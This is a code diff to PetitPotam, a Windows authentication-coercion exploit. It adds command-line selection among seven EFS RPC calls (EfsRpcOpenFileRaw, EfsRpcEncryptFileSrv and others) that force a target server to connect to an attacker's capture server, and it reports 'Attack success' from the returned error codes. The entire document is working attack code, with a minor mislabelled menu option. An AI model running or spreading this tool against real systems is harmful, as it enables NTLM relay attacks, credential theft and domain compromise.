@@ -74,21 +74,89 @@ handle_t Bind(wchar_t* target)
 
 int wmain(int argc, wchar_t** argv, wchar_t** envp)
 {
-	wprintf(L"Usage: PetitPotam.exe <captureServerIP> <targetServerIP> \n");
-	handle_t ht = Bind(argv[2]);
-	HRESULT hr = NULL;
-	PEXIMPORT_CONTEXT_HANDLE plop;
-	SecureZeroMemory((char*)&(plop), sizeof(plop));
-	wchar_t buffer[100];
-	swprintf(buffer, 100, L"\\\\%s\\test\\topotam.exe", argv[1]);
-	 
-	long flag = 0;
-
-	hr = EfsRpcOpenFileRaw(ht, &plop, buffer, flag);
-
-	if (hr == ERROR_BAD_NETPATH) {
-		wprintf(L"Attack success!!!\n");
+	if (argc != 4)
+	{
+		wprintf(L"Usage: PetitPotam.exe <captureServerIP> <targetServerIP> <EFS-API-to-use>\n");
+		wprintf(L"\n");
+		wprintf(L"Valid EFS APIs are:\n");
+		wprintf(L"1: EfsRpcOpenFileRaw (fixed with CVE-2021-36942)\n");
+		wprintf(L"2: EfsRpcEncryptFileSrv\n");
+		wprintf(L"3: EfsRpcDecryptFileSrv\n");
+		wprintf(L"4: EfsRpcQueryUsersOnFile\n");
+		wprintf(L"5: EfsRpcQueryRecoveryAgents\n");
+		wprintf(L"6: EfsRpcRemoveUsersFromFile\n");
+		wprintf(L"6: EfsRpcAddUsersToFile\n");
 	}
-				
-	return 0;
+	else
+	{
+		handle_t ht = Bind(argv[2]);
+		HRESULT hr = NULL;
+		PEXIMPORT_CONTEXT_HANDLE plop;
+		SecureZeroMemory((char*)&(plop), sizeof(plop));
+		wchar_t buffer[100];
+		swprintf(buffer, 100, L"\\\\%s\\test\\topotam.exe", argv[1]);
+
+		int errorgroup;
+
+		if (wcscmp(argv[3], L"1") == 0)
+		{
+			errorgroup = 1;
+			long flag = 0;
+			hr = EfsRpcOpenFileRaw(ht, &plop, buffer, flag);
+		}
+		if (wcscmp(argv[3], L"2") == 0)
+		{
+			errorgroup = 1;
+			hr = EfsRpcEncryptFileSrv(ht, buffer);
+		}
+		if (wcscmp(argv[3], L"3") == 0)
+		{
+			errorgroup = 1;
+
+			long flag = 0;
+			hr = EfsRpcDecryptFileSrv(ht, buffer, flag);
+		}
+		if (wcscmp(argv[3], L"4") == 0)
+		{
+			errorgroup = 1;
+			ENCRYPTION_CERTIFICATE_HASH_LIST* blub;
+			hr = EfsRpcQueryUsersOnFile(ht, buffer, &blub);
+		}
+		if (wcscmp(argv[3], L"5") == 0)
+		{
+			errorgroup = 1;
+			ENCRYPTION_CERTIFICATE_HASH_LIST* blub;
+			hr = EfsRpcQueryRecoveryAgents(ht, buffer, &blub);
+		}
+		if (wcscmp(argv[3], L"6") == 0)
+		{
+			errorgroup = 1;
+			ENCRYPTION_CERTIFICATE_HASH_LIST blub;
+			hr = EfsRpcRemoveUsersFromFile(ht, buffer, &blub);
+		}
+		if (wcscmp(argv[3], L"7") == 0)
+		{
+			errorgroup = 2;
+			ENCRYPTION_CERTIFICATE_LIST blub;
+			hr = EfsRpcAddUsersToFile(ht, buffer, &blub);
+		}
+
+
+
+		if (hr == ERROR_BAD_NETPATH && errorgroup == 1) {
+			wprintf(L"Attack success!!!\n");
+			return 0;
+		}
+		if (hr == ERROR_ACCESS_DENIED && errorgroup == 2) {
+			wprintf(L"Attack success!!!\n");
+			return 0;
+		}
+		else
+		{
+			wprintf(L"Did not receive expected output. Attack might have failed.");
+			return 1;
+		}
+
+
+	}
 }
